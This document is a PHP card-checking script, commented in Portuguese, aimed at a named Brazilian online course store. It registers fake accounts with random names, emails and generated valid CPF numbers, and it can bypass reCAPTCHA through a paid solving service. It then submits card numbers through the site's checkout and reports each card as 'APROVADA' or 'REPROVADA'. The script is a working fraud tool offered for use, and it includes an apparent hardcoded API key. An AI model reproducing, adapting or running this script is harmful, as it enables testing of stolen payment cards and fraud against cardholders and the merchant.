<?php

// ======================== CONFIGURAÇÕES ========================
$apiKey = '462e760ef4e12810e7f2a6c37193b5fa';
$websiteUrl = 'https://voceconcursado.com.br/?lrm=1';
$websiteKey = '6LcTy6wZAAAAANnqLnqTS4wsrrxyj_R04Sk6iEG4';

// ======================== FUNÇÕES AUXILIARES ========================

function getCaptchaToken($apiKey, $websiteUrl, $websiteKey) {
    $taskData = [
        "clientKey" => $apiKey,
        "task" => [
            "type" => "NoCaptchaTaskProxyless",
            "websiteURL" => $websiteUrl,
            "websiteKey" => $websiteKey
        ]
    ];
    
    $ch = curl_init("https://api.capmonster.cloud/createTask");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($taskData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $result = json_decode($response, true);
    if (!isset($result['errorId']) || $result['errorId'] !== 0) return null;
    
    $taskId = $result['taskId'];
    $attempts = 0;
    
    while ($attempts < 30) {
        $resultData = ["clientKey" => $apiKey, "taskId" => $taskId];
        $ch = curl_init("https://api.capmonster.cloud/getTaskResult");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($resultData));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        $response = curl_exec($ch);
        curl_close($ch);
        
        $result = json_decode($response, true);
        if ($result['status'] === 'ready') return $result['solution']['gRecaptchaResponse'];
        
        $attempts++;
        sleep(2);
    }
    return null;
}

function buscar($string, $inicio, $fim) {
    $inicioPos = strpos($string, $inicio);
    if ($inicioPos === false) return false;
    $inicioPos += strlen($inicio);
    $fimPos = strpos($string, $fim, $inicioPos);
    if ($fimPos === false) return false;
    return substr($string, $inicioPos, $fimPos - $inicioPos);
}

function gerarUserAgent() {
    $versoes = ['120', '121', '122', '123'];
    $versao = $versoes[array_rand($versoes)];
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$versao}.0.0.0 Safari/537.36";
}

function generateUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    return explode($delimiters[0], $one);
}

// ======================== GERAR CPF VÁLIDO ========================
function gerarCPF() {
    $cpf = '';
    for ($i = 0; $i < 9; $i++) {
        $cpf .= rand(0, 9);
    }
    
    // Primeiro dígito verificador
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
        $soma += (int)$cpf[$i] * (10 - $i);
    }
    $resto = $soma % 11;
    $digito1 = ($resto < 2) ? 0 : 11 - $resto;
    
    // Segundo dígito verificador
    $cpf_com_digito1 = $cpf . $digito1;
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
        $soma += (int)$cpf_com_digito1[$i] * (11 - $i);
    }
    $resto = $soma % 11;
    $digito2 = ($resto < 2) ? 0 : 11 - $resto;
    
    return $cpf . $digito1 . $digito2;
}

// ======================== DADOS PARA TESTE ========================
$nomes = ['Carlos', 'João', 'Maria', 'Paulo', 'Ana', 'Lucas', 'Bruna', 'Rafael', 'Camila', 'Roberto'];
$sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Pereira', 'Costa', 'Rodrigues', 'Almeida', 'Lima', 'Barbosa'];

$nome = $nomes[array_rand($nomes)];
$sobrenome = $sobrenomes[array_rand($sobrenomes)];
$email = strtolower($nome . $sobrenome . rand(1, 99) . '@gmail.com');
$userAgent = gerarUserAgent();
$uuid = generateUUID();
$cpf = gerarCPF();

// ======================== ENTRADA DO CARTÃO ========================
$lista = $_GET['lista'] ?? ($argv[1] ?? '');
$parts = multiexplode([":", "|"], $lista);
$cc = $parts[0] ?? '';
$mes = ltrim($parts[1] ?? '', '0');
$ano = substr($parts[2] ?? '', 2);
$cvv = $parts[3] ?? '';

// Validação do cartão
if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
    echo "❌ Erro: Dados do cartão incompletos. Formato: CC:MES:ANO:CVV\n";
    exit;
}

// Divide o cartão
$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, 4);
$cc3 = substr($cc, 8, 4);
$cc4 = substr($cc, 12, 4);

// Define bandeira
$bandeira = 'unknown';
$primeiro = substr($cc, 0, 1);
if ($primeiro == 4) $bandeira = 'visa';
elseif ($primeiro == 5 || $primeiro == 2) $bandeira = 'mastercard';
elseif ($primeiro == 3) $bandeira = 'amex';

// ======================== CAPTCHA ========================
$token = $_GET['token'] ?? ($argv[2] ?? null);

// Validar token
if (empty($token)) {
    echo "⚠️ Aviso: Token de recaptcha não fornecido. Usando token teste.\n";
    $token = 'TEST_TOKEN_MOCK';
}

// ======================== COOKIE ========================
$cookieFile = __DIR__ . DIRECTORY_SEPARATOR . 'cookie_' . uniqid() . '.txt';

// ======================== REQUISIÇÕES ========================
$ch = curl_init();
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Variáveis para armazenar dados extraídos
$version_hash = '';
$state = '';
$security_signup = '';
$process_nonce = '';

// 1. Home
echo "[1/7] Acessando página inicial...\n";
curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/');
curl_setopt($ch, CURLOPT_POST, false);
$response = curl_exec($ch);
if (!$response) {
    echo "❌ Erro ao acessar home\n";
    exit;
}

// 2. Product Page
echo "[2/7] Acessando página de produto...\n";
curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/academia-de-discursivas/');
curl_setopt($ch, CURLOPT_POST, false);
$response = curl_exec($ch);
if (!$response) {
    echo "❌ Erro ao acessar produto\n";
    exit;
}

// Extrair dados da página de produto
$version_hash = buscar($response, '"version_hash":"', '"') ?: '';
$state = buscar($response, "type='hidden' class='gform_hidden' name='state_92' value='", "'") ?: '';
$security_signup = buscar($response, "name='security-signup' value='", "'") ?: '';

if (empty($version_hash)) {
    echo "⚠️ Aviso: version_hash não encontrado\n";
}

// 3. Register
echo "[3/7] Realizando cadastro...\n";
curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/?lrm=1');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'email' => $email,
    'password' => $nome . '777@!',
    'password-confirmation' => $nome . '777@!',
    'registration_terms' => 'yes',
    'g-recaptcha-response' => $token,
    'redirect_to' => '',
    'lrm_action' => 'signup',
    'wp-submit' => '1',
    'is_popup_register' => '1',
    'security-signup' => $security_signup,
    '_wp_http_referer' => '/carrinho/'
]));
$response = curl_exec($ch);
if (!$response) {
    echo "❌ Erro ao realizar cadastro\n";
    exit;
}

// 4. Add to Cart
echo "[4/7] Adicionando item ao carrinho...\n";
curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/carrinho/?add-to-cart=222045');
curl_setopt($ch, CURLOPT_POST, false);
$response = curl_exec($ch);
if (!$response) {
    echo "❌ Erro ao adicionar ao carrinho\n";
    exit;
}

// 5. Cart Page
echo "[5/7] Acessando página do carrinho...\n";
curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/carrinho/');
curl_setopt($ch, CURLOPT_POST, false);
$response = curl_exec($ch);
if (!$response) {
    echo "❌ Erro ao acessar carrinho\n";
    exit;
}

// 6. Checkout Page
echo "[6/7] Acessando página de checkout...\n";
curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/finalizar-compra/');
curl_setopt($ch, CURLOPT_POST, false);
$response = curl_exec($ch);
if (!$response) {
    echo "❌ Erro ao acessar checkout\n";
    exit;
}

// Extrair nonce de segurança
$process_nonce = buscar($response, 'name="woocommerce-process-checkout-nonce" value="', '"');
if (!$process_nonce) {
    echo "❌ Erro: Nonce de checkout não encontrado\n";
    exit;
}

// 7. Final Checkout
echo "[7/7] Processando pagamento...\n";
curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'billing_first_name' => $nome,
    'billing_last_name' => $sobrenome,
    'billing_cpf' => $cpf,
    'billing_country' => 'BR',
    'billing_postcode' => '83322-450',
    'billing_address_1' => 'Rua Todos os Santos',
    'billing_number' => '32',
    'billing_neighborhood' => 'Weissópolis',
    'billing_city' => 'Pinhais',
    'billing_state' => 'PA',
    'billing_phone' => '(11) 99839-2832',
    'billing_email' => $email,
    'payment_method' => 'vindi-credit-card',
    'vindi_cc_fullname' => strtoupper($nome . ' ' . $sobrenome),
    'vindi_cc_number' => "$cc1 $cc2 $cc3 $cc4",
    'vindi_cc_cvc' => $cvv,
    'vindi_cc_paymentcompany' => $bandeira,
    'vindi_cc_monthexpiry' => $mes,
    'vindi_cc_yearexpiry' => $ano,
    'vindi_cc_installments' => '1',
    'terms' => 'on',
    'terms-field' => '1',
    'woocommerce-process-checkout-nonce' => $process_nonce,
    '_wp_http_referer' => '/?wc-ajax=update_order_review'
]));

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// ======================== RESULTADO ========================
echo "\n" . str_repeat("=", 50) . "\n";

if (!$response) {
    echo "❌ Erro: Falha na requisição final\n";
} else {
    $json = json_decode($response, true);
    
    if (isset($json['result']) && $json['result'] === 'success') {
        echo "✅ APROVADA: $cc|$mes|$ano|$cvv\n";
        echo "   Email: $email\n";
        echo "   CPF: $cpf\n";
        echo "   HTTP Status: $httpCode\n";
    } else {
        $msg = isset($json['messages']) ? strip_tags($json['messages']) : (json_encode($json) ?: 'Erro desconhecido');
        echo "❌ REPROVADA: $cc|$mes|$ano|$cvv\n";
        echo "   Motivo: $msg\n";
        echo "   HTTP Status: $httpCode\n";
    }
}

echo str_repeat("=", 50) . "\n";

// Limpeza
if (file_exists($cookieFile)) {
    unlink($cookieFile);
}
?>
